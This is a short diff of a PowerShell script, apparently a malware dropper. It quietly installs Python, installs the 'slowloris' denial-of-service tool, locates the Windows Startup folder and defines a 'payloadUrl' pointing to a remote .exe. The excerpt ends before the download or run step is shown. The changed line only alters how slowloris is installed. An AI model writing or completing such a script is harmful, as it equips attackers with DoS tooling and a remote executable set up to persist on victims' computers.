@@ -5,7 +5,7 @@ Start-Process -Wait -FilePath $pythonInstaller -ArgumentList "/quiet", "PrependP
 Remove-Item -Path $pythonInstaller -Force
 $pythonBinFolder = (Get-Command python).Source.Substring(0, (Get-Command python).Source.LastIndexOf('\'))
 $env:Path += ";$pythonBinFolder"
-Start-Process -FilePath "cmd.exe" -ArgumentList "/K pip install slowloris" -WindowStyle Hidden
+Start-Process -FilePath "pip" -ArgumentList "install slowloris" -NoNewWindow -Wait
 
 $startupFolder = Join-Path $env:USERPROFILE "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $payloadUrl = "https://khumoyun.uz/res/win7/main.exe"
